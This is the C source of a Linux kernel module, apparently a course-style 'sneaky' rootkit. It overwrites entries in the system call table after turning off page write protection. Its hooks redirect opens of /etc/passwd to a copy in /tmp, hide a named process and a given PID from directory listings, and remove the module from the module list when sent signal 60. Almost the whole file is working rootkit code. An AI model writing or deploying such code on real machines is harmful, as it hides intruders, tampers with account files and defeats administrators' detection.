#include <linux/module.h> // for all modules
#include <linux/init.h>	  // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>	   // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/slab.h>
#include <linux/dirent.h>



#define PREFIX "sneaky_process"
#define ORIG_PWD "/etc/passwd"
#define DEST_PWD "/tmp/passwd"


// This is a pointer to the system call table
static unsigned long *sys_call_table;
static char *my_pid = "";
module_param(my_pid, charp, 0);
static int hide_mod = 0;
static struct list_head *prev_mod;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long)ptr, &level);
	if (pte->pte & ~_PAGE_RW)
	{
		pte->pte |= _PAGE_RW;
	}
	return 0;
}

int disable_page_rw(void *ptr) {
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long)ptr, &level);
	pte->pte = pte->pte & ~_PAGE_RW;
	return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int (*original_kill)(struct pt_regs *);


// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    char __user * file_name = (char*) regs->si;
    char *name_buf = NULL;
    name_buf = kzalloc(NAME_MAX, GFP_KERNEL);
    copy_from_user(name_buf, file_name, NAME_MAX);
    if (strcmp(ORIG_PWD, name_buf) == 0 ) {
        memcpy(name_buf, (char *)DEST_PWD, strlen(ORIG_PWD));
    }
    copy_to_user(file_name, name_buf, NAME_MAX);
    kfree(name_buf);
	return (*original_openat)(regs);
}


// this method is used to check the directories if containing the specific keywords
asmlinkage int sneaky_sys_getdents64( struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *curr_dir = NULL, *dirent_ker = NULL, *prev_dir = NULL;
    long length = original_getdents64(regs);
    long offset = 0;
    dirent_ker = kzalloc(length, GFP_KERNEL);
    copy_from_user(dirent_ker, dirent, length);
    while (length > offset) {
        long step_length = 0;
        curr_dir = (void *)dirent_ker + offset;
        step_length =  curr_dir->d_reclen;
        if ((strcmp(PREFIX, curr_dir->d_name) 
                && strncmp(my_pid, curr_dir->d_name, strlen(my_pid)))) {
            prev_dir = curr_dir;
            offset += step_length;
            continue;
        }
        if (curr_dir == dirent_ker) {
            length -= step_length;
            memcpy(curr_dir, (void *)curr_dir + step_length, length);
            continue;
        }
        prev_dir->d_reclen += step_length;
        offset += step_length;
    }
    copy_to_user(dirent, dirent_ker, length);
    kfree(dirent_ker);
    return length;
}

// hide the mod in lsmod
asmlinkage int sneaky_sys_kill(struct pt_regs *regs) {
    if (regs->si != 60) return original_kill(regs);
    if (hide_mod) {
        list_add(&THIS_MODULE->list, prev_mod);
    } else {
        prev_mod = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    }
    hide_mod = 1 - hide_mod;
    return 0;
}

static int initialize_sneaky_module(void) {
	// See /var/log/syslog or use `dmesg` for kernel print output
	printk(KERN_INFO "Sneaky module being loaded.\n");

	// Lookup the address for this symbol. Returns 0 if not found.
	// This address will change after rebooting due to protection
	sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

	// This is the magic! Save away the original 'openat' system call
	// function address. Then overwrite its address in the system call
	// table with the function address of our new code.
	original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents64 = (void*)sys_call_table[__NR_getdents64];
    original_kill = (void*)sys_call_table[__NR_kill];    


	// Turn off write protection mode for sys_call_table
	enable_page_rw((void *)sys_call_table);

	sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)sneaky_sys_kill;

    printk("[Debug] sneaky_mod: Loaded, received pid: %s  \n", my_pid);


	// Turn write protection mode back on for sys_call_table
	disable_page_rw((void *)sys_call_table);

	return 0; // to show a successful load
}



static void exit_sneaky_module(void) {
	printk(KERN_INFO "Sneaky module being unloaded.\n");

	// Turn off write protection mode for sys_call_table
	enable_page_rw((void *)sys_call_table);

	// This is more magic! Restore the original 'open' system call
	// function address. Will look like malicious code was never there!
	sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)original_kill;  


    printk("[Debug] sneaky_mod: Unloaded :-(\n");

	// Turn write protection mode back on for sys_call_table
	disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);	   // what's called upon unloading
MODULE_LICENSE("GPL");